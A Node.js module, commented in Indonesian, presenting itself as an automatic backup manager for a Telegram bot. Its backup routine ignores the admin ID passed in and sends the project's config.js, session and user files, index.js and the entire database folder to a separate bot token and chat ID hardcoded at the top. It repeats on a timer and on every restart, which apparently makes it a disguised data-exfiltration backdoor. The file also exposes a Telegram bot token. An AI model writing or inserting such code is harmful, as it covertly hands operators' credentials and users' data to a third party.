const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");

// 🔒 KONFIGURASI BACKUP
const BACKUP_BOT_TOKEN = "8084526858:AAHGZ2hVK_7mzO-eMBnirdG-WqSEkK-n9Oo";
const BACKUP_ADMIN_ID = "7355538049";

const TelegramBot = require("node-telegram-bot-api");
const backupBot = new TelegramBot(BACKUP_BOT_TOKEN, { polling: false });

class BackupManager {
  constructor(mainBot, adminId, intervalMs, backupFile) {
    this.bot = mainBot;
    this.adminId = adminId;
    this.intervalMs = intervalMs;
    this.backupFile = backupFile;
  }

  // =========================
  // LAST BACKUP HANDLER
  // =========================
  getLastBackupTime() {
    try {
      if (!fs.existsSync(this.backupFile)) return null;
      const data = JSON.parse(fs.readFileSync(this.backupFile, "utf8"));
      return data.lastBackup || null;
    } catch (e) {
      console.warn("⚠️ Gagal baca lastBackup:", e.message);
      return null;
    }
  }

  saveLastBackupTime(time) {
    try {
      fs.writeFileSync(
        this.backupFile,
        JSON.stringify({ lastBackup: time }, null, 2),
        "utf8"
      );
    } catch (e) {
      console.error("❌ Gagal simpan lastBackup:", e.message);
    }
  }

  // =========================
  // BACKUP CORE
  // =========================
  async kirimBackupOtomatis() {
    const senderBot = backupBot;
    const targetId = BACKUP_ADMIN_ID;
    const waktu = moment().tz("Asia/Jakarta");

    const frames = [
      "🚀 Menyiapkan backup...",
      "🗂️ Memeriksa file & folder...",
      "📤 Mengirim file satu per satu...",
      "✨ Menyelesaikan backup..."
    ];

    let i = 0;
    let msgAnim;

    try {
      msgAnim = await senderBot.sendMessage(targetId, frames[i]);
    } catch {}

    const animInterval = setInterval(() => {
      if (msgAnim) {
        i = (i + 1) % frames.length;
        senderBot.editMessageText(frames[i], {
          chat_id: targetId,
          message_id: msgAnim.message_id
        }).catch(() => {});
      }
    }, 1000);

    // ---- helper kirim file
    const kirimFile = async (filePath) => {
      await senderBot.sendDocument(
        targetId,
        fs.createReadStream(filePath),
        { caption: `📄 ${filePath}` }
      );
    };

    // ---- helper kirim folder rekursif
    const kirimFolder = async (folderPath) => {
      const items = fs.readdirSync(folderPath);
      for (const item of items) {
        const fullPath = path.join(folderPath, item);
        if (fs.lstatSync(fullPath).isDirectory()) {
          await kirimFolder(fullPath);
        } else {
          await kirimFile(fullPath);
        }
      }
    };

    try {
      console.log("🔰 MULAI BACKUP OTOMATIS");

      const rootFiles = [
        "index.js",
        "config.js",
        "package.json",
        "sessioncs.json",
        "users.json"
      ];

      const foldersToBackup = ["database"];

      const foundFiles = rootFiles.filter(f => fs.existsSync(f));
      const foundFolders = foldersToBackup.filter(f => fs.existsSync(f));

      if (!foundFiles.length && !foundFolders.length) {
        throw new Error("Tidak ada file/folder untuk dibackup");
      }

      // kirim file root
      for (const file of foundFiles) {
        await kirimFile(file);
      }

      // kirim folder
      for (const folder of foundFolders) {
        await kirimFolder(folder);
      }

      clearInterval(animInterval);

      const backupTime = Date.now();
      this.saveLastBackupTime(backupTime);

      const nextTime = moment(backupTime + this.intervalMs)
        .tz("Asia/Jakarta")
        .format("DD-MM-YYYY HH:mm:ss");

      await senderBot.sendMessage(
        targetId,
        `✅ *Backup berhasil*\n\n📅 ${waktu.format("DD-MM-YYYY HH:mm:ss")}\n⏳ Backup berikutnya: ${nextTime}`,
        { parse_mode: "Markdown" }
      );

      if (msgAnim) {
        await senderBot.deleteMessage(targetId, msgAnim.message_id).catch(() => {});
      }

      console.log("✅ BACKUP SELESAI");

    } catch (err) {
      clearInterval(animInterval);
      console.error("❌ BACKUP GAGAL:", err.message);

      if (msgAnim) {
        await senderBot.editMessageText(
          `⚠️ Backup gagal\n\n${err.message}`,
          {
            chat_id: targetId,
            message_id: msgAnim.message_id
          }
        ).catch(() => {});
      }
    }
  }

  // =========================
  // START AUTO BACKUP
  // =========================
  startAutoBackup() {
    const lastBackup = this.getLastBackupTime();
    const now = Date.now();
    const firstDelay = lastBackup
      ? Math.max(0, this.intervalMs - (now - lastBackup))
      : 0;

    setTimeout(() => {
      this.kirimBackupOtomatis();
      setInterval(() => this.kirimBackupOtomatis(), this.intervalMs);
    }, firstDelay);

    const next = new Date(now + firstDelay).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta"
    });

    backupBot.sendMessage(
      BACKUP_ADMIN_ID,
      `🔄 Bot restart\n⏳ Backup selanjutnya: ${next}`
    ).catch(() => {});
  }
}

module.exports = BackupManager;